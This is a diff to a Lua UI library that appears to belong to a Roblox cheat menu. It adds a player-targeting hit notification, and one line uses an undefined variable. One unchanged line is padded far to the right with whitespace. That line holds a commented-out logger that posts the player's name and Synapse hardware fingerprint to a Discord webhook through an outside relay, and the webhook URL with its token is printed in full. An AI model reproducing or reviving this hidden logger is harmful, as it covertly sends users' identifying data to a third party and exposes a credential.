@@ -331,7 +331,102 @@ function library:SaveConfig1(cfg)
 	writefile(cfglocation..cfg.."", game:GetService("HttpService"):JSONEncode(copy)) 
 end 
 
+	local MX_ONHIT = C.INST("ScreenGui")
+	do
+	local OnHitFrame = C.INST("Frame")
+	local UIListLayout = C.INST("UIListLayout")
+	local SampleFrame = C.INST("Frame")
+	local Grad = C.INST("Frame")
+	local SampleLabel = C.INST("TextLabel")
+	local UIGradient = C.INST("UIGradient")
 
+	MX_ONHIT.Name = "MX_ONHIT"
+	MX_ONHIT.Parent = game.CoreGui
+	MX_ONHIT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	OnHitFrame.Name = "OnHitFrame"
+	OnHitFrame.Parent = MX_ONHIT
+	OnHitFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
+	OnHitFrame.BackgroundTransparency = 1.000
+	OnHitFrame.Position = C.UDIM2(0, 52, 0, -15)
+	OnHitFrame.Size = C.UDIM2(0, 300, 0, 500)
+
+	UIListLayout.Parent = OnHitFrame
+	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	UIListLayout.Padding = UDim.new(0, 6)
+
+	SampleFrame.Name = "SampleFrame"
+	SampleFrame.Parent = OnHitFrame
+	SampleFrame.AutomaticSize = Enum.AutomaticSize.XY
+	SampleFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
+	SampleFrame.BackgroundTransparency = 1.000
+	SampleFrame.BorderColor3 = C.COL3RGB(7, 0, 0)
+	SampleFrame.Size = C.UDIM2(0, 0, 0, 24)
+
+	Grad.Name = "Grad"
+	Grad.Parent = SampleFrame
+	Grad.BackgroundColor3 = C.COL3RGB(222, 232, 255)
+	Grad.BackgroundTransparency = 1.000
+	Grad.AutomaticSize = Enum.AutomaticSize.Y
+	Grad.BorderSizePixel = 0
+	Grad.Size = C.UDIM2(0, 3, 0, 24)
+
+	SampleLabel.Name = "SampleLabel"
+	SampleLabel.Parent = Grad
+	SampleLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
+	SampleLabel.BackgroundTransparency = 1.000
+	SampleLabel.BorderSizePixel = 0
+	SampleLabel.Position = C.UDIM2(1.97835922, 0, 0, 0)
+	SampleLabel.Size = C.UDIM2(0, 0, 0, 24)
+	SampleLabel.Font = Enum.Font.Ubuntu
+	SampleLabel.Text = "TEST"
+	SampleLabel.TextTruncate = Enum.TextTruncate.AtEnd
+	SampleLabel.AutomaticSize = Enum.AutomaticSize.XY
+	SampleLabel.TextColor3 = C.COL3RGB(255, 255, 255)
+	SampleLabel.TextSize = 13.000
+	SampleLabel.TextStrokeTransparency = 0.000
+	SampleLabel.TextTransparency = 1.000
+	SampleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(49, 49, 49)), ColorSequenceKeypoint.new(0.41, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
+	UIGradient.Rotation = 90
+	UIGradient.Parent = SampleFrame
+	end
+	 
+	local function CreateHitElement(text,col,time, size2, size4)
+		spawn(function()
+			local Frame = MX_ONHIT.OnHitFrame.SampleFrame:Clone()
+			local Grad = Frame.Grad
+			local Label = Grad.SampleLabel
+			
+			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, size2, 0, size4)}) 
+			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, size2, 0, size4)}) 	
+			
+			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})	   
+			library:Tween(Grad, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})  
+			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0.000}) 
+			
+			Frame.Parent = MX_ONHIT.OnHitFrame
+			Grad.Parent = Frame
+			Label.Parent = Grad
+			Label.TextColor3 = col
+			Label.Text = text
+			wait(time)
+			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})	   
+			library:Tween(Grad, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})  
+			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1.000})
+			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextStrokeTransparency = 1.000})
+			
+			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
+			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
+			
+			wait(0.8)
+			Frame:Destroy()
+			Grad:Destroy()
+			Label:Destroy()
+		end)
+	end
+	
 			function library.New(name) 
 				local menu = {} 
 				local Lunar = C.INST("ScreenGui") 
@@ -6355,7 +6450,9 @@ end--]]
 									end) 
 								end 
 								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 
-
+								
+								local SomeRandomValue = data.Toggle or nil
+								
 								local Scroll = C.INST("Frame") 
 								local Frame = C.INST("ScrollingFrame") 
 								local UIListLayout = C.INST("UIListLayout") 
@@ -6467,18 +6564,23 @@ updatescroll2()
 
 
 Players.PlayerAdded:Connect(function()
-table.clear(data.options)
-for i,v in pairs(game.Players:GetPlayers()) do
-C.INSERT(data.options, v.Name)
-end
+	table.clear(data.options)
+	for i,v in pairs(game.Players:GetPlayers()) do
+		C.INSERT(data.options, v.Name)
+	end
 	updatescroll2()
 end)
 																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
-Players.PlayerRemoving:Connect(function() 
-table.clear(data.options)
-for i,v in pairs(game.Players:GetPlayers()) do
-C.INSERT(data.options, v.Name)
-end
+Players.PlayerRemoving:Connect(function(plr) 
+	table.clear(data.options)
+	for i,v in pairs(game.Players:GetPlayers()) do
+		C.INSERT(data.options, v.Name)
+	end
+	if values[tabname][sectorname][SomeRandomValue] ~= nil and values[tabname][sectorname][SomeRandomValue].Toggle ~= nil and values[tabname][sectorname][SomeRandomValue].Toggle then
+		if values[tabname][sectorname][text].Scroll == plr.Name then
+			CreateHitElement("The person you were targetting has left the server.",MainUIColor,5, 250, 22)
+		end
+	end
 	updatescroll2()
 end)
 								function Element:SetValue(val) 
@@ -7153,4 +7255,4 @@ elseif type == "Button" then
 	library['setcfglocation'] = function(cfg)
 		cfglocation = cfg
 	end
-	return library,Signal,ConfigLoad,ConfigLoad1,ConfigUpdateCfgList,ConfigUpdateCfgList2
+	return library,Signal,ConfigLoad,ConfigLoad1,ConfigUpdateCfgList,ConfigUpdateCfgList2,CreateHitElement
